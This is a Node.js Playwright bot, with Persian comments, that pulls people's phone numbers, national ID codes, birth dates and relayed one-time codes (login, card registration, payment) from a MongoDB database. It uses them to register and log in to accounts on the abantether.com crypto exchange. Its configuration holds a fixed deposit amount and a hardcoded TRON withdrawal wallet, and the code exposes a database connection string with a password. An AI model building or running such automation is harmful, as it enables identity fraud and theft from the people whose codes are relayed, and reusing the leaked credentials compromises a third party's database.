const { chromium } = require('playwright');
const { MongoClient } = require('mongodb');

class AbanTetherBot {
    constructor() {
        // تنظیمات MongoDB
        this.mongoUri = 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority';
        this.dbName = 'ZarrinApp';
        this.collectionName = 'zarinapp';
        
        // تنظیمات سایت
        this.website = {
            baseUrl: 'https://abantether.com',
            registerUrl: 'https://abantether.com/register',
            timeout: 60000, // افزایش تایم‌اوت
            headless: false // اول false بزارید تا ببینید چه خبره
        };
        
        // تنظیمات تراکنش
        this.transaction = {
            depositAmount: '5000000',
            withdrawAddress: 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS',
            maxRetries: 3,
            retryDelay: 5000
        };
        
        this.mongoClient = null;
        this.db = null;
        this.collection = null;
        this.isRunning = true;
        this.processingUsers = new Set();
    }

    async initialize() {
        console.log('🚀 شروع ربات آبان تتر...');
        
        try {
            // اتصال به MongoDB
            this.mongoClient = new MongoClient(this.mongoUri);
            await this.mongoClient.connect();
            this.db = this.mongoClient.db(this.dbName);
            this.collection = this.db.collection(this.collectionName);
            console.log('✅ متصل به MongoDB');
        } catch (error) {
            console.error('❌ خطا در اتصال به MongoDB:', error);
            throw error;
        }
    }

    async startPolling() {
        console.log('🔄 شروع نظارت بر دیتابیس (هر 30 ثانیه)...');
        
        // اجرای اولیه
        await this.checkDatabase();
        
        // تنظیم تایمر برای چک هر 30 ثانیه
        setInterval(async () => {
            await this.checkDatabase();
        }, 30000);
    }

    async checkDatabase() {
        try {
            console.log('🔍 در حال بررسی دیتابیس...');
            
            // جستجوی کاربران نیازمند پردازش
            const query = {
                $or: [
                    { otp_login: { $exists: true, $ne: null, $ne: '' } },
                    { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
                    { otp_payment: { $exists: true, $ne: null, $ne: '' } }
                ],
                processed: { $ne: true },
                status: { $ne: 'failed' },
                $or: [
                    { retryCount: { $exists: false } },
                    { retryCount: { $lt: this.transaction.maxRetries } }
                ]
            };

            const pendingUsers = await this.collection.find(query).limit(5).toArray();
            
            console.log(`📊 ${pendingUsers.length} کاربر نیازمند پردازش پیدا شد`);
            
            for (const user of pendingUsers) {
                // اگر کاربر در حال پردازش است، ردش کن
                if (this.processingUsers.has(user.personalPhoneNumber)) {
                    console.log(`⏭️ کاربر ${user.personalPhoneNumber} در حال پردازش است`);
                    continue;
                }
                
                // اگر تعداد تلاش‌ها بیش از حد مجاز است
                const retryCount = user.retryCount || 0;
                if (retryCount >= this.transaction.maxRetries) {
                    console.log(`⛔ کاربر ${user.personalPhoneNumber} بیش از حد تلاش کرده`);
                    await this.markUserFailed(user.personalPhoneNumber, 'تعداد تلاش‌ها بیش از حد مجاز', false);
                    continue;
                }
                
                // شروع پردازش
                this.processUser(user);
            }
        } catch (error) {
            console.error('❌ خطا در بررسی دیتابیس:', error);
        }
    }

    async processUser(user) {
        const phoneNumber = user.personalPhoneNumber;
        console.log(`👤 شروع پردازش کاربر: ${phoneNumber}`);
        
        // علامت‌گذاری کاربر به عنوان در حال پردازش
        this.processingUsers.add(phoneNumber);
        
        try {
            // آپدیت وضعیت به در حال پردازش
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                {
                    $set: {
                        status: 'processing',
                        startedAt: new Date(),
                        retryCount: (user.retryCount || 0) + 1
                    },
                    $inc: { __v: 1 }
                }
            );
            
            // اجرای مراحل پردازش
            const result = await this.executeUserProcess(user);
            
            if (result.success) {
                console.log(`✅ کاربر ${phoneNumber} با موفقیت پردازش شد`);
                await this.markUserCompleted(phoneNumber, result.details);
            } else {
                console.log(`❌ خطا در پردازش کاربر ${phoneNumber}: ${result.error}`);
                await this.markUserFailed(phoneNumber, result.error, result.retry);
            }
            
        } catch (error) {
            console.error(`💥 خطای بحرانی در پردازش کاربر ${phoneNumber}:`, error);
            await this.markUserFailed(phoneNumber, `خطای بحرانی: ${error.message}`, true);
        } finally {
            // حذف کاربر از لیست در حال پردازش
            this.processingUsers.delete(phoneNumber);
        }
    }

    async executeUserProcess(user) {
        let browser = null;
        let page = null;
        
        try {
            // راه‌اندازی مرورگر
            console.log('🌐 راه‌اندازی مرورگر...');
            browser = await chromium.launch({
                headless: this.website.headless,
                args: ['--no-sandbox', '--disable-setuid-sandbox']
            });
            
            const context = await browser.newContext({
                viewport: { width: 1280, height: 800 },
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                locale: 'fa-IR'
            });
            
            page = await context.newPage();
            await page.setDefaultTimeout(this.website.timeout);
            
            console.log(`📝 مرحله 1: ثبت‌نام برای ${user.personalPhoneNumber}`);
            
            // رفتن به صفحه ثبت‌نام
            await page.goto(this.website.registerUrl, { 
                waitUntil: 'networkidle',
                timeout: 60000 
            });
            
            // گرفتن اسکرین‌شات برای دیباگ
            await page.screenshot({ path: 'debug-1-loaded.png' });
            console.log('📸 اسکرین‌شات گرفته شد: debug-1-loaded.png');
            
            // چک کردن محتوای صفحه
            const pageContent = await page.content();
            console.log('📄 اولین 1000 کاراکتر صفحه:', pageContent.substring(0, 1000));
            
            // پیدا کردن فیلد موبایل
            console.log('🔍 در جستجوی فیلد موبایل...');
            const mobileFilled = await this.findAndFillMobile(page, user.personalPhoneNumber);
            if (!mobileFilled) {
                throw new Error('فیلد موبایل پیدا نشد');
            }
            
            // پیدا کردن دکمه ادامه
            console.log('🔍 در جستجوی دکمه ادامه...');
            const continueClicked = await this.findAndClickContinue(page);
            if (!continueClicked) {
                throw new Error('دکمه ادامه پیدا نشد');
            }
            
            await page.waitForTimeout(3000);
            
            // گرفتن اسکرین‌شات بعد از کلیک ادامه
            await page.screenshot({ path: 'debug-2-after-continue.png' });
            console.log('📸 اسکرین‌شات گرفته شد: debug-2-after-continue.png');
            
            // انتظار برای OTP لاگین
            console.log('⏳ منتظر OTP لاگین...');
            const otpLogin = await this.waitForFieldInDatabase(user.personalPhoneNumber, 'otp_login');
            if (!otpLogin) {
                throw new Error('OTP لاگین دریافت نشد');
            }
            
            console.log(`✅ OTP لاگین دریافت شد: ${otpLogin}`);
            
            // وارد کردن OTP لاگین
            console.log('🔢 وارد کردن OTP لاگین...');
            const otpEntered = await this.enterOtp(page, otpLogin);
            if (!otpEntered) {
                throw new Error('نتوانست OTP را وارد کند');
            }
            
            // پیدا کردن دکمه تأیید OTP
            console.log('🔍 در جستجوی دکمه تأیید OTP...');
            const verifyOtpClicked = await this.findAndClickVerify(page);
            if (!verifyOtpClicked) {
                throw new Error('دکمه تأیید OTP پیدا نشد');
            }
            
            await page.waitForTimeout(5000);
            
            // گرفتن اسکرین‌شات بعد از ورود
            await page.screenshot({ path: 'debug-3-after-login.png' });
            console.log('📸 اسکرین‌شات گرفته شد: debug-3-after-login.png');
            
            // چک کردن اگر صفحه پروفایل است
            const currentUrl = page.url();
            console.log(`📍 آدرس فعلی: ${currentUrl}`);
            
            if (currentUrl.includes('profile') || currentUrl.includes('complete')) {
                console.log('👤 مرحله 2: تکمیل اطلاعات هویتی');
                
                // پر کردن اطلاعات هویتی
                const profileFilled = await this.fillProfileInfo(page, user);
                if (!profileFilled) {
                    throw new Error('نتوانست اطلاعات پروفایل را پر کند');
                }
                
                // پیدا کردن دکمه تکمیل ثبت‌نام
                console.log('🔍 در جستجوی دکمه تکمیل ثبت‌نام...');
                const completeClicked = await this.findAndClickCompleteRegistration(page);
                if (!completeClicked) {
                    throw new Error('دکمه تکمیل ثبت‌نام پیدا نشد');
                }
            }
            
            await page.waitForTimeout(5000);
            
            // ادامه مراحل بعدی...
            // بقیه مراحل را بعد از اینکه این بخش کار کرد اضافه می‌کنیم
            
            return {
                success: true,
                details: {
                    stepsCompleted: ['register', 'login'],
                    completedAt: new Date()
                }
            };
            
        } catch (error) {
            console.error('❌ خطا در اجرای فرآیند:', error);
            
            // گرفتن اسکرین‌شات در صورت خطا
            if (page) {
                try {
                    await page.screenshot({ path: 'error-screenshot.png' });
                    console.log('📸 اسکرین‌شات خطا گرفته شد: error-screenshot.png');
                } catch (screenshotError) {
                    console.error('❌ خطا در گرفتن اسکرین‌شات:', screenshotError);
                }
            }
            
            return {
                success: false,
                error: error.message,
                retry: true
            };
        } finally {
            if (page) {
                try {
                    await page.close();
                } catch (e) {
                    console.error('❌ خطا در بستن صفحه:', e);
                }
            }
            if (browser) {
                try {
                    await browser.close();
                } catch (e) {
                    console.error('❌ خطا در بستن مرورگر:', e);
                }
            }
        }
    }

    async findAndFillMobile(page, phoneNumber) {
        console.log(`📱 در حال پر کردن شماره موبایل: ${phoneNumber}`);
        
        // لیست سلکتورهای ممکن برای فیلد موبایل
        const mobileSelectors = [
            'input[type="tel"]',
            'input[type="text"]',
            'input[name*="phone"]',
            'input[name*="mobile"]',
            'input[placeholder*="موبایل"]',
            'input[placeholder*="شماره"]',
            'input[placeholder*="تلفن"]',
            'input[id*="phone"]',
            'input[id*="mobile"]',
            'input[class*="phone"]',
            'input[class*="mobile"]',
            '//input[contains(@placeholder, "موبایل")]',
            '//input[contains(@placeholder, "شماره")]',
            '//input[@type="tel"]'
        ];
        
        for (const selector of mobileSelectors) {
            try {
                console.log(`🔍 امتحان سلکتور: ${selector}`);
                const elements = await page.$$(selector);
                
                for (let i = 0; i < elements.length; i++) {
                    const element = elements[i];
                    const isVisible = await element.isVisible();
                    const isEnabled = await element.isEnabled();
                    
                    if (isVisible && isEnabled) {
                        // خالی کردن فیلد اول
                        await element.fill('');
                        await page.waitForTimeout(500);
                        
                        // پر کردن فیلد
                        await element.fill(phoneNumber);
                        await page.waitForTimeout(1000);
                        
                        // بررسی اگر مقدار وارد شده
                        const value = await element.inputValue();
                        if (value.includes(phoneNumber) || value.includes(phoneNumber.substring(1))) {
                            console.log(`✅ شماره موبایل وارد شد: ${value}`);
                            return true;
                        }
                    }
                }
            } catch (error) {
                // ادامه به سلکتور بعدی
                continue;
            }
        }
        
        // اگر با سلکتورهای بالا پیدا نشد، سعی می‌کنیم تمام inputها را چک کنیم
        try {
            const allInputs = await page.$$('input');
            console.log(`🔍 تعداد کل inputها: ${allInputs.length}`);
            
            for (let i = 0; i < allInputs.length; i++) {
                const input = allInputs[i];
                try {
                    const isVisible = await input.isVisible();
                    const isEnabled = await input.isEnabled();
                    
                    if (isVisible && isEnabled) {
                        // امتحان کردن input
                        await input.fill('');
                        await page.waitForTimeout(300);
                        await input.fill('9'); // عدد تست
                        await page.waitForTimeout(300);
                        
                        const value = await input.inputValue();
                        if (value === '9') {
                            // این احتمالا یک فیلد عددی است
                            await input.fill('');
                            await input.fill(phoneNumber);
                            await page.waitForTimeout(1000);
                            
                            const finalValue = await input.inputValue();
                            console.log(`🔍 فیلد ${i} امتحان شد، مقدار: ${finalValue}`);
                            
                            if (finalValue.includes(phoneNumber) || finalValue.includes(phoneNumber.substring(1))) {
                                console.log(`✅ شماره در فیلد ${i} وارد شد`);
                                return true;
                            }
                        }
                        
                        // پاک کردن مقدار تست
                        await input.fill('');
                    }
                } catch (e) {
                    continue;
                }
            }
        } catch (error) {
            console.error('❌ خطا در جستجوی تمام inputها:', error);
        }
        
        return false;
    }

    async findAndClickContinue(page) {
        console.log('🔍 در جستجوی دکمه ادامه...');
        
        // لیست متن‌های ممکن برای دکمه ادامه
        const buttonTexts = [
            'ادامه',
            'ارسال',
            'بعدی',
            'تایید',
            'تأیید',
            'ورود',
            'Login',
            'Next',
            'Continue',
            'Submit',
            'Send'
        ];
        
        // لیست سلکتورهای ممکن برای دکمه
        const buttonSelectors = [
            'button',
            'a[role="button"]',
            'div[role="button"]',
            'input[type="submit"]',
            '[class*="button"]',
            '[class*="btn"]'
        ];
        
        // اول: جستجو با متن
        for (const text of buttonTexts) {
            try {
                console.log(`🔍 جستجوی دکمه با متن: "${text}"`);
                
                // روش 1: XPath
                const xpath = `//*[text()="${text}" or contains(text(), "${text}")]`;
                const elementsByXPath = await page.$$(xpath);
                
                for (const element of elementsByXPath) {
                    try {
                        const tagName = await element.evaluate(el => el.tagName.toLowerCase());
                        const isClickable = tagName === 'button' || tagName === 'a' || tagName === 'input' || 
                                           await element.evaluate(el => el.getAttribute('role') === 'button');
                        
                        if (isClickable && await element.isVisible() && await element.isEnabled()) {
                            console.log(`✅ دکمه "${text}" با XPath پیدا شد`);
                            await element.click();
                            return true;
                        }
                    } catch (e) {
                        continue;
                    }
                }
                
                // روش 2: Selector با :has-text
                const selector = `:has-text("${text}")`;
                const elementsByText = await page.$$(selector);
                
                for (const element of elementsByText) {
                    try {
                        const tagName = await element.evaluate(el => el.tagName.toLowerCase());
                        const isClickable = tagName === 'button' || tagName === 'a' || tagName === 'input' || 
                                           await element.evaluate(el => el.getAttribute('role') === 'button');
                        
                        if (isClickable && await element.isVisible() && await element.isEnabled()) {
                            console.log(`✅ دکمه "${text}" با :has-text پیدا شد`);
                            await element.click();
                            return true;
                        }
                    } catch (e) {
                        continue;
                    }
                }
            } catch (error) {
                continue;
            }
        }
        
        // دوم: جستجو در تمام دکمه‌ها
        for (const selector of buttonSelectors) {
            try {
                console.log(`🔍 جستجو با سلکتور: ${selector}`);
                const elements = await page.$$(selector);
                console.log(`🔍 تعداد عناصر پیدا شده: ${elements.length}`);
                
                for (let i = 0; i < elements.length; i++) {
                    try {
                        const element = elements[i];
                        const isVisible = await element.isVisible();
                        const isEnabled = await element.isEnabled();
                        
                        if (isVisible && isEnabled) {
                            // گرفتن متن دکمه
                            const text = await element.textContent();
                            console.log(`🔍 دکمه ${i}: "${text}"`);
                            
                            // اگر دکمه متن معقولی دارد کلیک کن
                            if (text && text.trim().length > 0 && text.trim().length < 50) {
                                console.log(`🖱️ کلیک بر دکمه با متن: "${text.trim()}"`);
                                await element.click();
                                return true;
                            }
                        }
                    } catch (e) {
                        continue;
                    }
                }
            } catch (error) {
                continue;
            }
        }
        
        // سوم: جستجو در تمام عناصر قابل کلیک
        try {
            const allElements = await page.$$('button, a, input[type="button"], input[type="submit"], [role="button"], [onclick]');
            console.log(`🔍 تعداد عناصر قابل کلیک: ${allElements.length}`);
            
            for (let i = 0; i < allElements.length; i++) {
                try {
                    const element = allElements[i];
                    const isVisible = await element.isVisible();
                    const isEnabled = await element.isEnabled();
                    
                    if (isVisible && isEnabled) {
                        const text = await element.textContent();
                        console.log(`🔍 عنصر قابل کلیک ${i}: "${text}"`);
                        
                        // کلیک روی اولین دکمه قابل مشاهده
                        if (text && text.trim()) {
                            console.log(`🖱️ کلیک بر عنصر ${i} با متن: "${text.trim()}"`);
                            await element.click();
                            return true;
                        }
                    }
                } catch (e) {
                    continue;
                }
            }
        } catch (error) {
            console.error('❌ خطا در جستجوی عناصر قابل کلیک:', error);
        }
        
        // چهارم: امتحان کلیک روی عناصر با موقعیت ثابت
        try {
            // شاید دکمه با موقعیت خاصی باشد
            const body = await page.$('body');
            if (body) {
                // کلیک در مرکز صفحه (شاید دکمه modal یا popup باشد)
                const viewport = page.viewportSize();
                await page.mouse.click(viewport.width / 2, viewport.height / 2);
                console.log('🖱️ کلیک در مرکز صفحه');
                return true;
            }
        } catch (error) {
            console.error('❌ خطا در کلیک مرکزی:', error);
        }
        
        return false;
    }

    async enterOtp(page, otp) {
        console.log(`🔢 وارد کردن OTP: ${otp}`);
        
        if (!otp || otp.length < 4) {
            throw new Error('OTP معتبر نیست');
        }
        
        // روش 1: جستجوی فیلدهای OTP جداگانه
        const singleDigitSelectors = [
            'input[type="tel"]',
            'input[type="number"]',
            'input[maxlength="1"]',
            'input[style*="width"][style*="height"]', // معمولا فیلدهای OTP اندازه خاصی دارند
            'div[class*="otp"] input',
            'div[class*="code"] input'
        ];
        
        for (const selector of singleDigitSelectors) {
            try {
                const inputs = await page.$$(selector);
                if (inputs.length >= 4) { // حداقل 4 فیلد برای OTP
                    console.log(`🔍 ${inputs.length} فیلد OTP پیدا شد`);
                    
                    for (let i = 0; i < Math.min(inputs.length, otp.length); i++) {
                        try {
                            await inputs[i].fill(otp[i]);
                            await page.waitForTimeout(200);
                        } catch (e) {
                            continue;
                        }
                    }
                    return true;
                }
            } catch (error) {
                continue;
            }
        }
        
        // روش 2: جستجوی فیلد تک‌
        const singleInputSelectors = [
            'input[type="tel"][maxlength="6"]',
            'input[type="number"][maxlength="6"]',
            'input[name*="otp"]',
            'input[name*="code"]',
            'input[placeholder*="کد"]',
            'input[placeholder*="رمز"]'
        ];
        
        for (const selector of singleInputSelectors) {
            try {
                const input = await page.$(selector);
                if (input && await input.isVisible()) {
                    await input.fill(otp);
                    return true;
                }
            } catch (error) {
                continue;
            }
        }
        
        // روش 3: امتحان کردن تمام inputها
        try {
            const allInputs = await page.$$('input');
            console.log(`🔍 تعداد کل inputها برای OTP: ${allInputs.length}`);
            
            for (const input of allInputs) {
                try {
                    if (await input.isVisible()) {
                        // امتحان کردن input
                        await input.fill('123456');
                        await page.waitForTimeout(500);
                        
                        const value = await input.inputValue();
                        if (value === '123456') {
                            // این فیلد می‌تواند OTP باشد
                            await input.fill('');
                            await input.fill(otp);
                            return true;
                        }
                        // پاک کردن مقدار تست
                        await input.fill('');
                    }
                } catch (e) {
                    continue;
                }
            }
        } catch (error) {
            console.error('❌ خطا در جستجوی OTP:', error);
        }
        
        throw new Error('فیلد OTP پیدا نشد');
    }

    async findAndClickVerify(page) {
        console.log('🔍 در جستجوی دکمه تأیید...');
        
        const verifyTexts = ['تأیید', 'تایید', 'ورود', 'ادامه', 'ثبت', 'Verify', 'Confirm', 'Submit'];
        
        for (const text of verifyTexts) {
            try {
                const selector = `:has-text("${text}")`;
                const elements = await page.$$(selector);
                
                for (const element of elements) {
                    try {
                        if (await element.isVisible() && await element.isEnabled()) {
                            console.log(`✅ دکمه "${text}" پیدا شد`);
                            await element.click();
                            return true;
                        }
                    } catch (e) {
                        continue;
                    }
                }
            } catch (error) {
                continue;
            }
        }
        
        return false;
    }

    async fillProfileInfo(page, user) {
        console.log('👤 پر کردن اطلاعات پروفایل...');
        
        const profileFields = [
            { key: 'personalName', label: 'نام', value: user.personalName },
            { key: 'personalNationalCode', label: 'کد ملی', value: user.personalNationalCode },
            { key: 'personalBirthDate', label: 'تاریخ تولد', value: user.personalBirthDate },
            { key: 'personalCity', label: 'شهر', value: user.personalCity },
            { key: 'personalProvince', label: 'استان', value: user.personalProvince }
        ];
        
        let filledCount = 0;
        
        for (const field of profileFields) {
            try {
                // جستجوی فیلد با label
                const filled = await this.findAndFillByLabel(page, field.label, field.value);
                if (filled) {
                    filledCount++;
                    await page.waitForTimeout(500);
                }
            } catch (error) {
                console.error(`❌ خطا در پر کردن ${field.label}:`, error);
            }
        }
        
        console.log(`✅ ${filledCount} از ${profileFields.length} فیلد پر شد`);
        return filledCount > 0;
    }

    async findAndFillByLabel(page, label, value) {
        // روش‌های مختلف برای پیدا کردن فیلد
        const methods = [
            // با placeholder
            async () => {
                const selector = `input[placeholder*="${label}"]`;
                const input = await page.$(selector);
                if (input && await input.isVisible()) {
                    await input.fill(value);
                    return true;
                }
                return false;
            },
            
            // با label element
            async () => {
                const xpath = `//label[contains(text(), "${label}")]/following::input[1]`;
                const input = await page.$(xpath);
                if (input && await input.isVisible()) {
                    await input.fill(value);
                    return true;
                }
                return false;
            },
            
            // با name
            async () => {
                const selector = `input[name*="${label.toLowerCase().replace(' ', '')}"]`;
                const input = await page.$(selector);
                if (input && await input.isVisible()) {
                    await input.fill(value);
                    return true;
                }
                return false;
            },
            
            // جستجو در تمام inputها
            async () => {
                const allInputs = await page.$$('input, textarea, select');
                for (const input of allInputs) {
                    try {
                        if (await input.isVisible()) {
                            // امتحان کردن input
                            await input.fill('test');
                            await page.waitForTimeout(100);
                            const testValue = await input.inputValue();
                            
                            if (testValue === 'test') {
                                await input.fill('');
                                await input.fill(value);
                                return true;
                            }
                            await input.fill('');
                        }
                    } catch (e) {
                        continue;
                    }
                }
                return false;
            }
        ];
        
        for (const method of methods) {
            try {
                const result = await method();
                if (result) {
                    console.log(`✅ فیلد "${label}" پر شد: ${value}`);
                    return true;
                }
            } catch (error) {
                continue;
            }
        }
        
        return false;
    }

    async findAndClickCompleteRegistration(page) {
        // مشابه findAndClickContinue اما برای تکمیل ثبت‌نام
        return await this.findAndClickContinue(page);
    }

    async waitForFieldInDatabase(phoneNumber, fieldName, maxAttempts = 180) { // 3 دقیقه
        console.log(`⏳ منتظر پر شدن ${fieldName} برای ${phoneNumber}...`);
        
        let attempts = 0;
        while (attempts < maxAttempts && this.isRunning) {
            try {
                const user = await this.collection.findOne(
                    { personalPhoneNumber: phoneNumber },
                    { projection: { [fieldName]: 1, _id: 0 } }
                );
                
                if (user && user[fieldName] && user[fieldName].toString().trim() !== '') {
                    const value = user[fieldName].toString();
                    console.log(`✅ ${fieldName} دریافت شد: ${value}`);
                    return value;
                }
                
                attempts++;
                if (attempts % 10 === 0) {
                    console.log(`⏳ ${attempts} ثانیه از ${maxAttempts} منتظر ${fieldName}...`);
                }
                
                await new Promise(resolve => setTimeout(resolve, 1000));
                
            } catch (error) {
                console.error(`❌ خطا در چک کردن ${fieldName}:`, error);
                await new Promise(resolve => setTimeout(resolve, 1000));
                attempts++;
            }
        }
        
        console.log(`⏰ زمان انتظار برای ${fieldName} به پایان رسید`);
        return null;
    }

    async markUserCompleted(phoneNumber, details = {}) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                {
                    $set: {
                        processed: true,
                        status: 'completed',
                        completedAt: new Date(),
                        ...details
                    },
                    $unset: {
                        otp_login: "",
                        otp_register_card: "",
                        otp_payment: ""
                    },
                    $inc: { __v: 1 }
                }
            );
            console.log(`✅ کاربر ${phoneNumber} به عنوان تکمیل‌شده علامت‌گذاری شد`);
        } catch (error) {
            console.error(`❌ خطا در علامت‌گذاری کاربر به عنوان تکمیل‌شده:`, error);
        }
    }

    async markUserFailed(phoneNumber, reason, shouldRetry = false) {
        try {
            const updateData = {
                $set: {
                    status: 'failed',
                    failureReason: reason.substring(0, 500), // محدود کردن طول دلیل
                    failedAt: new Date()
                },
                $inc: { __v: 1 }
            };
            
            if (!shouldRetry) {
                updateData.$set.processed = true;
            }
            
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                updateData
            );
            
            console.log(`❌ کاربر ${phoneNumber} به عنوان ناموفق علامت‌گذاری شد: ${reason}`);
        } catch (error) {
            console.error(`❌ خطا در علامت‌گذاری کاربر به عنوان ناموفق:`, error);
        }
    }

    async cleanup() {
        console.log('🛑 پاکسازی منابع...');
        this.isRunning = false;
        
        if (this.mongoClient) {
            try {
                await this.mongoClient.close();
                console.log('✅ اتصال MongoDB بسته شد');
            } catch (error) {
                console.error('❌ خطا در بستن اتصال MongoDB:', error);
            }
        }
    }
}

// مدیریت خطاهای غیرمنتظره
process.on('uncaughtException', (error) => {
    console.error('🔥 خطای غیرمنتظره:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('🔥 خطای Reject نشده:', reason);
});

// اجرای اصلی
async function main() {
    const bot = new AbanTetherBot();
    
    try {
        await bot.initialize();
        console.log('✅ ربات آماده است');
        await bot.startPolling();
        
        // مدیریت خاتمه برنامه
        process.on('SIGINT', async () => {
            console.log('\n🛑 دریافت سیگنال خاتمه (Ctrl+C)...');
            await bot.cleanup();
            process.exit(0);
        });
        
        process.on('SIGTERM', async () => {
            console.log('\n🛑 دریافت سیگنال ترمینیت...');
            await bot.cleanup();
            process.exit(0);
        });
        
        console.log('🤖 ربات در حال اجراست. منتظر کاربران جدید...');
        console.log('⚠️  برای توقف: Ctrl+C');
        
        // نگه داشتن برنامه در حال اجرا
        await new Promise(() => {});
        
    } catch (error) {
        console.error('💥 خطای بحرانی در اجرای ربات:', error);
        await bot.cleanup();
        process.exit(1);
    }
}

// اگر این فایل مستقیماً اجرا شود
if (require.main === module) {
    main();
}

module.exports = AbanTetherBot;